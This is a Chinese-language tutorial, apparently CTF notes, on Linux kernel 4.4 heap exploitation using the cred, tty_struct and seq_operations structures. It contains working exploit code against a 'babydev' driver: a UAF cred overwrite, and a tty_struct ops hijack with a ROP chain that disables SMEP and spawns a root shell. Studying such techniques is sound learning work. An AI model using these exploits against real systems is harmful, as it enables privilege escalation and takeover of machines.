环境是 linux 4.4.72，比较老的一个版本。

## 结构体总结

### cred

当创建一个新进程时，内核会为其申请一个 struct cred 结构体，用于存放进程信息。

cred 结构体内容如下：

```c
// 结构体大小 0xa8
struct cred {
	atomic_long_t              usage;                /*     0     8 */
	kuid_t                     uid;                  /*     8     4 */
	kgid_t                     gid;                  /*    12     4 */
	kuid_t                     suid;                 /*    16     4 */
	kgid_t                     sgid;                 /*    20     4 */
	kuid_t                     euid;                 /*    24     4 */
	kgid_t                     egid;                 /*    28     4 */
	kuid_t                     fsuid;                /*    32     4 */
	kgid_t                     fsgid;                /*    36     4 */
	unsigned int               securebits;           /*    40     4 */
	
	/* XXX 4 bytes hole, try to pack */
	
	kernel_cap_t               cap_inheritable;      /*    48     8 */
	kernel_cap_t               cap_permitted;        /*    56     8 */
	/* --- cacheline 1 boundary (64 bytes) --- */
	kernel_cap_t               cap_effective;        /*    64     8 */
	kernel_cap_t               cap_bset;             /*    72     8 */
	kernel_cap_t               cap_ambient;          /*    80     8 */
	unsigned char              jit_keyring;          /*    88     1 */
	
	/* XXX 7 bytes hole, try to pack */
	
	struct key *               session_keyring;      /*    96     8 */
	struct key *               process_keyring;      /*   104     8 */
	struct key *               thread_keyring;       /*   112     8 */
	struct key *               request_key_auth;     /*   120     8 */
	/* --- cacheline 2 boundary (128 bytes) --- */
	void *                     security;             /*   128     8 */
	struct user_struct *       user;                 /*   136     8 */
	struct user_namespace *    user_ns;              /*   144     8 */
	struct ucounts *           ucounts;              /*   152     8 */
	struct group_info *        group_info;           /*   160     8 */
	union {
		int                non_rcu;              /*   168     4 */
		struct callback_head rcu;                /*   168    16 */
	};                                               /*   168    16 */

/* size: 184, cachelines: 3, members: 26 */
/* sum members: 173, holes: 2, sum holes: 11 */
/* last cacheline: 56 bytes */
};
```

最常见的打法就是把这个结构体的 uid / gid / suid / sgid 等全部改成 0，使得该子进程拥有root权限。

不过这个结构体在内核 4.5 之后，会使用单独的 叫做 `cred_jar` 的 kmem-cache 来独立分配，普通的 UAF 无法拿到这个结构体，也就没办法打了。


举个例子，在 `_do_fork` 上下断点，`fork` 函数会调用 `prepare_creds` 为子进程创建 cred 结构体，而 `prepare_creds` 会调用 `kmem_cache_alloc`：

![fork调用栈](https://pic1.imgdb.cn/item/68ecc757c5157e1a886c8f20.png)

然后 `p (struct kmem_cache)*0xffff880002c01800` 可以观察到这个函数是从 `kmalloc-192` 取 obj 的。

poc 如下：

```c
#include <kernel.h>

int main() {
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    ioctl(fd1, 0x10001, 0xa8);
    close(fd1);  // uaf
    pid_t pid = fork();
    if (pid < 0) {
        error("fork failed, pid = %d", pid);
    } else if (pid == 0) {
        info("child pid => %d", getpid());
        char zero[30] = {0};
        write(fd2, zero, 28);
        if (getuid() == 0) {
            success("getshell");
            system("/bin/sh");
        }
    } else {
        wait(NULL);
    }
    close(fd2);
    return 0;
}
```


### tty_struct


当用户态执行 `open("dev/ptmx",2);` 或者 `open("/dev/ptmx", O_RDWR | O_NOCTTY)` 后，内核中的处理过程如下图所示：

![tty_struct 分配流程](https://pic1.imgdb.cn/item/68ecca5fc5157e1a886c9eca.png)

其中，`alloc_tty_struct` 会从 `kmalloc-1024` 里取 obj 以满足 `tty_struct` 的 0x2e0 的内存需求。

`open` 操作后，用户态获得一个文件描述符 `fd`。用户态可对该 `fd` 进行 `tty_operations` 中包含的所有操作，如 `write`\`ioctl` 等。

如果利用漏洞改掉 `tty_struct` 中 `ops` 指向的函数表，就能实现控制流劫持。

如何确定申请到的 `tty_struct` 的位置呢？可以通过 `cat /proc/kallsyms | grep "ptm_unix98_lookup"` 找到 `ptm_unix98_lookup` 的位置，然后 `search -8` 找到 rwx 段上的地址，就能定位到 `ptm_unix98_ops`，然后再根据 `ptm_unix98_ops` 定位即可，那个地址就是 `tty_operations` 字段。

另外，0x5401 是 `tty_struct` 的魔数。


调试时，比如说 hook 的是 `pty_write` 函数，这个函数会调用 `n_tty_write`，在 n_tty_write+892 处下断点即可断在调用 hook 的函数前。

还有一种方法是使用硬件访问断点 `rwatch`，比如 `rwatch *A`，A 是 `pty_write` 函数地址。

```c
#include <kernel.h>


#define mov_rsp_rax 0xffffffff818855cf
#define pop_rsp_ret 0xffffffff8101ebc5
#define pop_rax_ret 0xffffffff8101c216
#define mov_cr4_rax_pop_ret 0xffffffff8100f034
#define swapgs_ret 0xffffffff81885588
#define iretq 0xffffffff81884177


int main() {
    save_status();

    unsigned long rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = pop_rax_ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = mov_cr4_rax_pop_ret;
    rop_chain[index++] = 0;
    rop_chain[index++] = (unsigned long)get_root;
    rop_chain[index++] = swapgs_ret;
    rop_chain[index++] = iretq;
    rop_chain[index++] = (unsigned long)get_root_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;


    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);  // uaf


    int fd_tty = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (fd_tty < 0) {
        error("open ptmx failed: %d", fd_tty);
    }
    success("fd_tty => %d\n", fd_tty);

    unsigned long *mem[4];
    unsigned long fake_ops[30] = {0, 1, 2, 3, 4, 5, 6, 7};
    read(fd2, mem, 32);
    for (int i = 0; i < 4; ++i)
        info("0x%llx", mem[i]);
    // 修改 ops 为 fake_ops
    mem[3] = fake_ops;
    fake_ops[0] = pop_rsp_ret;  // 继续迁移到 rop_chain 上
    fake_ops[1] = (unsigned long)rop_chain;
    fake_ops[7] = mov_rsp_rax;  // pty_write，注意到 rax 为 fake_ops 地址，可以用来栈迁移

    write(fd2, mem, 0x38);

    char a[32];
    write(fd_tty, a, 32);  // 触发

    close(fd_tty);
    close(fd2);
    return 0;
}
```

### seq_operations

在用户态执行 `open("/proc/self/stat",0);` 后，内核中的调用过程如下图所示：

![seq](https://pic1.imgdb.cn/item/68ed244fc5157e1a886d07b5.png)

内核中会调用 `single_open()` 函数，而该函数中会为 `struct seq_operations` 结构体申请一段内存空间（0x20 字节大小，对应 `kmalloc-32`）。

返回的结构体里有四个字段：

```c
struct seq_operations {
	void *                     (*start)(struct seq_file *, loff_t *); /*     0     8 */
	void                       (*stop)(struct seq_file *, void *); /*     8     8 */
	void *                     (*next)(struct seq_file *, void *, loff_t *); /*    16     8 */
	int                        (*show)(struct seq_file *, void *); /*    24     8 */

/* size: 32, cachelines: 1, members: 4 */
/* last cacheline: 32 bytes */
};

其中 `start` 和 `stop` 都是可以被劫持的，当用户态对该 `fd` 进行读操作 `read(fd,buf,size)` 时，在内核中会调用 `seq_operations->start` 函数指针；随后也会调用 `seq_operations->stop` 函数指针` 


